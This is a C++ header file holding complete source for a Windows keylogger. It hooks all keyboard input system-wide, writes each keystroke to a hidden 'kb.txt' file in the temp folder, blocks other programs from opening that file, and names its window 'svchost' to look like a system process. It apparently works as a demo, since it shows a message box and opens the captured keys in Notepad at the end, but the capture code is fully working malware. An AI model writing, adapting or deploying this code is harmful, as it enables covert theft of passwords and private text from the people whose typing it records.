#pragma once
#include <atlbase.h>
#include <atlconv.h>
#include <regex>
#include <string>
#include <vector>
#include <windows.h>
#define CLASSNAME "winkey"
#define WINDOWTITLE	"svchost"
#define KBPATH "kb.txt"
#define SPANISH_STRINGS 1

HHOOK kbdhook;
HANDLE f;
bool running;

LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp) {
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = { 0 };
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*) lp);

		bool printable;

		std::vector<std::string> lang_str {
			// Unprintable String - ID
#if !SPANISH_STRINGS
			"CAPSLOCK",
			"SHIFT",
			"ENTER",
			"SPACE",
			"TAB"
#else
			"BLOQ MAYUS",
			"MAYUSCULAS",
			"ENTRAR",
			"BARRA ESPACIADORA",
			"TABULACION"
#endif
		};

		std::vector<std::string>::iterator fnd;

		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);

		GetKeyNameTextA(msg, tmp, 0xFF);

		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		auto checkID = [&](std::string ID) -> int {
			// Checks if the string exists in the table, if not, returns 0, else returns the string ID
			// The string ID is the pos of the string + 1
			return ((fnd = find(lang_str.begin(), lang_str.end(), ID)) == lang_str.end()) ? 0 : fnd - lang_str.begin() + 1;
		};

		if (!printable) {
			int type = checkID(str);

			if (type == 1) { // Caps lock
				capslock = !capslock;
			}
			else if (type == 2) { // Left/Right Shift
				shift = true;
			}

			// Write [CAPSLOCK] and [SHIFT] don't caring if they're detected

			switch (type) {
			case 3: // Enter
				str = "\r\n";
				printable = true;
				break;

			case 4: // Space bar
				str = " ";
				printable = true;
				break;

			case 5: // Tab
				str = "\t";
				printable = true;
				break;

			default:
				str = ("[" + str + "]");
			}
			// You can translate the unprintable strings to your idiom
		}

		if (printable) {
			if (shift == capslock) {
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			}
			else {
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}
			shift = false;
		}

		DWORD wrt;
		WriteFile(f, &str[0], str.size(), &wrt, NULL);
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}

LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
	switch (msg) {
	case WM_CLOSE: case WM_DESTROY:
		break;
	default:
		return DefWindowProc(hwnd, msg, wp, lp);
	}
	return 0;
}

void killmsg() {
	int r = MessageBoxA(NULL, "Press OK to close and show the captured keys", "Close", MB_ICONINFORMATION | MB_OK);

	if (r == IDOK) {
		running = false;
	}
	else {
		running = true;
	}
}

void MAIN(HINSTANCE hModule) {
	std::string fp;
	std::wstring tmp;
	tmp.resize(MAX_PATH);

	GetTempPathW(MAX_PATH, &tmp[0]);

	fp = std::string{ ATL::CW2A(tmp.data()).m_psz } + "\\" + KBPATH;
	fp = std::regex_replace(fp, std::regex(R"(\\\\)"), "\\");

	f = CreateFileA(fp.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
	// We don't share access to avoid being opened by notepad or any other editor

	if (f == INVALID_HANDLE_VALUE) {
		return;
	}

	HWND		hwnd;
	HWND		fgwindow = GetForegroundWindow();
	MSG		msg;
	WNDCLASSEXA	windowclass;
	HINSTANCE	modulehandle;
	windowclass.hInstance = hModule;
	windowclass.lpszClassName = CLASSNAME;
	windowclass.lpfnWndProc = windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.cbWndExtra = 0;
	windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	if (!(RegisterClassExA(&windowclass))) {
		return;
	}

	hwnd = CreateWindowExA(NULL, CLASSNAME, WINDOWTITLE, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL,
		hModule, NULL);

	if (!(hwnd))
		ShowWindow(hwnd, SW_SHOW);

	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow);
	modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);
	running = true;
	killmsg();

	while (running) {
		if (!GetMessage(&msg, NULL, 0, 0))
			running = false;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	CloseHandle(f); // When you kill the main process or close handle, the file is freed

	STARTUPINFOA st;
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&st, sizeof(st));

	// When I use .data() for some reason detects it as const char* (LPCSTR) instead char* (LPSTR)
	CreateProcessA("C:\\Windows\\System32\\notepad.exe",
		const_cast<LPSTR>(std::string{ " " + fp }.c_str()),
		NULL, NULL, 0, 0, NULL, NULL, &st, &pi);

	return;
}